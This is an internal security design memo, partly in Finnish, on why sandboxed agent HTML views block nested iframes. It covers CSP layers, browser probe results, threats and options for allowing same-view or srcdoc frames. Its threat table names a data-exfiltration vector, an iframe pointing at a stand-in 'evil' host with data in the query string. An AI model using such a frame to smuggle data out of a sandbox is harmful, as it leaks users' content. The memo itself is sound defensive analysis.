# Research: offered views and nested iframes

## Tiivistelmä Jarille

**Mikä on estetty.** Näkymän vastauksen CSP:ssä on `frame-src 'none'; child-src
'none'`. Siksi mikä tahansa `<iframe src="…">` näkymän sisällä estyy, osoitti se
mihin tahansa: saman näkymän toiseen tiedostoon, toiseen näkymään, Habitatiin tai
ulkoiselle sivulle. Lisäksi esto tappaa koko näkymän. Näkymään injektoitu
tarkistusskripti ilmoittaa rikkeestä, ja paneeli korvaa näkymän tekstillä
”Näkymä yritti avata toisen sivun”, vaikka näkymä yritti vain upottaa sivun.
**`<iframe srcdoc="…">` toimii jo nyt**: srcdoc ei ole verkkohaku, joten
`frame-src` ei koske sitä. Kokeilin tämän Chromella. Srcdoc-kehyksellä on oma
näkymäleveytensä (media queryt toimivat), ja sen suhteelliset `<script src>`- ja
`<img src>`-viittaukset latautuvat näkymän omista tiedostoista. Agenttiohje ei
kerro tätä, eikä se kerro iframe-estostakaan.

**Miksi.** Perusteluja on kirjattu kaksi. ADR 0032:n pohjatutkimus listasi
upotetut kehykset muiden kieltojen joukkoon (”deny network, workers, objects,
nested frames…”) ilman omaa perustelua. Toinen on 23.11. palautuskorjauksen
result.md: sallimisen sanotaan ”laajentavan aktiivisten dokumenttien pintaa” ja
vaativan oman tietoturvapäätöksen.

**Pitävätkö perustelut.** Kohtien (b)–(d) esto on aiheellinen, mutta suurin osa
uhista torjutaan jo muilla kerroksilla:
- Habitatin sovellusta ei voi kehystää kukaan (`frame-ancestors 'none'` ja
  `X-Frame-Options: DENY`).
- Editorin voi kehystää vain sovellus.
- Ulkoisen sivun upotus on oikea vuotokanava (`<iframe
  src="https://…/?data=…">`), ja sen torjuu nimenomaan näkymän `frame-src`.
  Se on syytä pitää estettynä.

Saman näkymän omien tiedostojen kehystämisessä (a) perustelu ei pidä. Lapsi
saisi täsmälleen saman hiekkalaatikon ja CSP:n kuin näkymä itse. Se näkisi vain
saman jäädytetyn exportin, eikä sillä olisi verkkoa. Näkymä voi jo nyt navigoida
itsensä samaan tiedostoon. Uusia kyvykkyyksiä ei siis tule.

**Yllätys toteutuksessa.** Jos `frame-src` vaihdetaan näkymän omaksi hostiksi,
lapsi estyy silti. Kokeilin Chromella (158): kun kehystäjä on hiekkalaatikossa
(läpinäkymätön origin), mikään `frame-ancestors`-arvo ei täsmää, ei `'self'`,
ei hostinimi eikä `*`. Lapsi latautuu vain, jos sen vastauksesta puuttuu
`frame-ancestors` kokonaan. Saman näkymän kehykset vaativat siis myös sen, että
alisivut saa kehystää mikä tahansa sivusto. Riski on pieni: sisältö on vain
luettavaa, läpinäkymättömässä originissa ja ilman verkkoa, ja yksityinen näkymä
vaatii lisäksi evästeen. Muutos on silti tietoturvapäätös eikä yhden rivin
korjaus.

**Suositus.**
1. *Heti, ilman tietoturvamuutosta:* agenttiohjeeseen yksi lause: upotettu
   kehys tehdään `srcdoc`:lla tai yhdeksi dokumentiksi, ja `src`-iframe kaataa
   näkymän. Palautusviestiin oma teksti upotuksen estolle, esim. ”Näkymä yritti
   upottaa sivun, jota ei voi näyttää”. Tämä palvelee jo prototyyppejä
   (puhelinleveyksiset esikatselut).
2. *Erillisenä päätöksenä (ADR 0032:n täydennys), jos srcdoc ei riitä:* saman
   näkymän `src`-kehykset sallitaan. Näkymän `frame-src` ja `child-src` saavat
   arvoksi tarkan oman hostin. Muista HTML-tiedostoista kuin entrystä jätetään
   `frame-ancestors` pois. Sama politiikka koskee yksityisiä ja julkaistuja
   näkymiä. Edellytys on Firefox- ja Safari-testi.
3. *Pysyy estettynä:* Habitatin sovellus ja kaikki sen sivut, editori, ulkoiset
   sivut, `data:`/`blob:`-kehykset ja toisten ihmisten näkymät. Toisen oman
   näkymän upotus vaatisi uuden sessiomekanismin, eikä se ole sen arvoinen.
   Agentti voi kopioida sen tiedostot samaan tarjoukseen. Työtilan elävät
   tiedostot näkymän originin kautta rikkoisivat ADR 0032:n periaatteen, että
   daemon jäädyttää näkymän tavut. Sen sijaan tiedosto otetaan mukaan
   tarjoukseen.

Toteuttamisen arvoisin osa on ilmainen kohta 1. Kohta 2 kannattaa tehdä vasta,
kun srcdoc on oikeasti osoittautunut riittämättömäksi.

---

## 1. What exactly is blocked, and where

All references are at `2966ee4e6`.

### The policy layers

| Layer | Where | Value |
|---|---|---|
| View response CSP (every response on a view host, errors included) | `internal/gateway/views_linux.go:316` (`viewHeaders`) | `sandbox allow-scripts; default-src 'none'; script-src <host> 'unsafe-inline' 'unsafe-eval'; style-src <host> 'unsafe-inline'; img-src <host> data: blob:; …; connect-src 'none'; frame-src 'none'; child-src 'none'; worker-src 'none'; object-src 'none'; form-action 'none'; base-uri 'none'; frame-ancestors <app origin>` |
| Panel and own-tab iframe | `web/src/components/ViewPanel.tsx:114` | `sandbox="allow-scripts"`, `referrerPolicy="no-referrer"`, `allow=""`. The own tab (`ViewOpenPage`) also frames the view, so the top-level page is always the app's. |
| App page CSP | `internal/gateway/server.go:197` (`appFramePolicy`), `:188` | `frame-ancestors 'none'; frame-src https://*.<view/editor parent domain>` plus `X-Frame-Options: DENY`. The app frames only the view and editor namespaces. Nothing frames the app. |
| Editor host | `internal/gateway/editor_linux.go:245` | `frame-ancestors 'self' <app origin>` |
| File offers on the app origin | `internal/gateway/fileoffers_linux.go:49`, `offer_links_linux.go:206` | `sandbox; …; frame-ancestors 'none'` |
| View cookie | `internal/gateway/views_linux.go:455` | `__Host-oh-view`, host-only, `SameSite=None` (needed because the sandboxed document's own requests count as cross-site) |
| Recovery probe | `internal/gateway/view_bootstrap.go:16-35`, injected into every served HTML file (`views_linux.go:651`). Parent side: `ViewPanel.tsx:52-88`. | It reports any enforced `frame-src`/`child-src` violation, and a missing answer within 3 s also counts. The panel then replaces the **whole** view with `navigationBlocked` ("Näkymä yritti avata toisen sivun") and a reopen button (`web/src/text/viewPanel.ts:14`). |

### What happens today

| Nested frame target | What happens |
|---|---|
| (a) Another path of the same view (`<iframe src="part.html">`) | The view's `frame-src 'none'` refuses it before any request is made. The bootstrap sees the violation, and the whole view is replaced by the recovery notice. The Playwright case "nested same-view frames stay blocked and offer recovery" (`web/tests/agent-views.spec.ts:316`) asserts this, including that no child request leaves. |
| (b) Another offered view | The same `frame-src` refusal and recovery. Even if it were allowed, the other view's host has no session cookie, because each view host gets its own cookie through a single-use handoff from the app (`redeemViewHandoff`). The result would be the 401 text "Näkymän istunto on päättynyt". `frame-ancestors <app>` would also refuse it (see §1.1). |
| (c) A Habitat page or file | Refused by the view's `frame-src`. Independently, the app origin answers with `frame-ancestors 'none'` + `X-Frame-Options: DENY`, file offers with `frame-ancestors 'none'`, and the editor with `frame-ancestors <app>`. |
| (d) An external site | Refused by the view's `frame-src`, with recovery. No other layer stops it. |
| `srcdoc` / `about:blank` frames | **They work.** They are not fetches, so `frame-src` does not apply. The child inherits the view's CSP and sandbox flags. |

Navigation, as opposed to embedding, is controlled elsewhere. In the panel, the
view navigating its own frame to a foreign host is refused by the **app's**
`frame-src` (the earlier view-frame-navigation fix). Moving to a sibling HTML
file of the same view is allowed.

### 1.1 Synthetic browser probe

I ran a throwaway probe with two local origins on headless Chrome 158. The "app"
framed a "view" with `sandbox="allow-scripts"`, and the view answered with the
same CSP shape plus `frame-src <view host>`. Each child reported whether it had
loaded by requesting an image. Results:

- A child answering with `frame-ancestors <app>`, `<app> <view host>`,
  `'self' <app>` or `*`: **requested but not rendered**. In every case the
  ancestor chain contains the view's opaque origin, which no host-source matches.
- A child with **no** `frame-ancestors`: rendered.
- `<iframe srcdoc="<script>…</script><img src=/x>">`: the script ran, and the
  relative image loaded from the view host.
- `<iframe srcdoc="<script src=part.js></script>">`: `part.js` loaded from the
  view host and ran. `innerWidth` was the frame's width, and a `max-width`
  media query matched the frame, not the window.

Firefox and WebKit were not tested. The opaque-ancestor behaviour of
`frame-ancestors` is the one thing that must be checked in those browsers
before option S in §3 is built.

## 2. Why it is there, and whether the reasons hold

### Stated reasons

- **ADR 0032** (`docs/decisions/adr-0032-agent-html-views.md`, decision 3)
  treats agent HTML as an "offline artifact": sandboxed scripts without
  same-origin rights, no network. It does not mention frames.
- **The ADR's research** (agent-html-artifacts `research.md`, see
  `scripts/from-history.sh issues/agent-html-artifacts/research.md`, §5
  "Offline artifact") lists "nested frames" in a deny-by-default list next to
  network, workers, objects, forms, top navigation and popups. No threat is
  named for frames in particular.
- **The 23.11. recovery fix** (`a9b58a52e`, view-location-href-replaces-frame
  `result.md`) chose to keep `frame-src 'none'` and not enable same-view or
  blob frames, because doing so "would expand the active-document surface and
  require a separate security decision". It also chose to replace the whole
  view when a nested frame is refused. Before that, the browser showed its own
  "This content is blocked" page inside the child frame, which is what Jari
  ran into.
- **Practice:** the account-menu prototype round 1 loaded each phone in an
  iframe and had to be rebuilt (`f21e4c7fc`). Production media queries were
  rewritten as container queries, `matchMedia` was faked, and so on. Other
  prototype rounds use `srcdoc` frames and work
  (`design-system/prototypes/rounds/2026-11-06-tilakortin-tie/page.html`).

### Threats, and what actually stops each

| Threat | Stopped by the view's `frame-src`? | Stopped by another layer? |
|---|---|---|
| Clickjacking or UI redress of Habitat's app inside agent HTML (an invisible app frame over a fake button, leading to publish, delete or approve) | Yes | **Yes, independently:** app `frame-ancestors 'none'` + `X-Frame-Options: DENY`. The probe adds that no view ancestor could ever match a host-source anyway. |
| Same, for the editor (a shell-capable session) | Yes | **Yes:** editor `frame-ancestors <app>`, and an opaque view ancestor does not match. |
| A shared or public view framing the visitor's signed-in Habitat | Yes | **Yes**, the same app headers. |
| Exfiltrating export content to an outside server through `<iframe src="https://evil/?d=…">` | **Yes. This is the only layer.** `connect-src 'none'` covers fetch/XHR/WebSocket only, and `img-src` is limited to the view host. | No |
| Phishing UI: a real external login page inside a Habitat panel | Yes, the only layer for embedding | Partly: the panel chrome labels the content as a view |
| Escaping "no network" or the frozen-copy promise | Yes, for external frames | For same-view frames there is nothing to escape: same host, same export, same CSP |
| Tracking a public view's visitors through an external frame | Yes, the only layer | No |
| Same-view frames reaching something the view cannot already reach | Nothing to stop: the child gets the same sandbox, CSP, opaque origin and export | The view can already navigate to the same file |

**Where the reasons do not hold.** "Expands the active-document surface" is true
only in the sense that more documents exist. Each extra document runs under
exactly the policy the view already has, and the view can already load the same
file by navigating to it. So the stated reason does not justify blocking
same-view frames. What does make that relaxation non-trivial is the
`frame-ancestors` finding in §1.1, and the reason that matters is that one, not
attack surface.

**Where they do hold.** External frames are a real exfiltration, phishing and
tracking channel, and the view's `frame-src` is the only defence. The app and
the editor must remain unframeable. They already are, independently of the
view policy, and those headers must never be relaxed to make a view feature
work.

**A presentation defect, whatever the policy.** A refused embed is reported as
"the view tried to open another page" and destroys the whole view. The text
says something that did not happen, and reopening runs into the same refusal
again.

## 3. What could be allowed safely

**0. Document what already works (no policy change).** `srcdoc` frames and
single-document composition. A srcdoc frame has its own viewport, so it suits
phone-width previews, and its relative URLs load from the view's own files.
Agent guide text, e.g. in `internal/cli/agent/SKILL.md` after "no CDN, `fetch`,
forms, popups or storage": *"A frame inside the view must be `<iframe srcdoc>`
(its relative URLs load from the view's files); an `<iframe src>` is refused and
replaces the view with a notice."*

**S. Same-view frames by URL.**
- Set `frame-src` and `child-src` to the exact view host. This is the `self`
  value `viewHeaders` already computes. On a link host it is that host, whose
  paths are under the link token.
- Omit `frame-ancestors` on HTML responses other than the view's entry. Keep
  it on the entry and on non-HTML files.
- Consequences:
  - A foreign site can frame a sub-page if it knows the host.
    - Private views: it also needs the person's view cookie, which is
      `SameSite=None` and therefore sent in third-party frames where the
      browser still allows third-party cookies. The framer still cannot read
      anything (cross-origin and opaque), and the document has no
      state-changing action, so the gain is display only.
    - Public views: sub-pages can be hotlinked within the link's existing
      traffic budgets.
  - The bootstrap is injected into children too. Their messages target the
    app origin but go to their parent, the view, so they are dropped.
    Foreign frames still trigger recovery.
  - The Playwright case at `agent-views.spec.ts:316` inverts.
  - Firefox and WebKit must be verified (§1.1).
  - Use the same policy for private and published views. Otherwise a
    prototype breaks when it is published.

**B. Other offered views of the same person.** The CSP would have to list
specific other view hosts, or the whole view namespace, which includes other
people's hosts. Each embedded host would also need a session minted without a
handoff, which is new authority in the gateway. Display gives no access, so
there is little security risk, but the plumbing is new and the use is covered
by copying files into one offer. Not recommended.

**F. Workspace files through the view origin.** Serving live home files on a
view host would break ADR 0032 decision 4: the owner daemon decides the bytes,
and the export-read route returns only that export's files. Including the file
in the offer gives the same result. Not recommended.

**Never:** the app origin and any of its pages, the editor, external sites,
`data:`/`blob:` frames (they add nothing over `srcdoc` and widen the source
list for no use) and other people's views.

## 4. Recommendation

Smallest change that serves "a frame pointing back to Habitat's own content":

1. **Now:** option 0, plus a distinct recovery text for a refused embed
   (`view_bootstrap.go` already knows the directive was `frame-src`/`child-src`,
   so it can report a separate reason from a lost document). Neither changes
   what the browser is allowed to do.
2. **If srcdoc is not enough** (for example, agents keep writing `src`
   frames): option S, recorded as an amendment to ADR 0032 because it relaxes
   a policy that ADR set. Do a cross-browser probe of the opaque-ancestor
   `frame-ancestors` behaviour first.
3. **Stays blocked:** external frames (the only exfiltration layer), the app
   and the editor (keep their `frame-ancestors` exactly as they are),
   `data:`/`blob:`, other people's views, and, for now, other views of the
   same person and live workspace files.
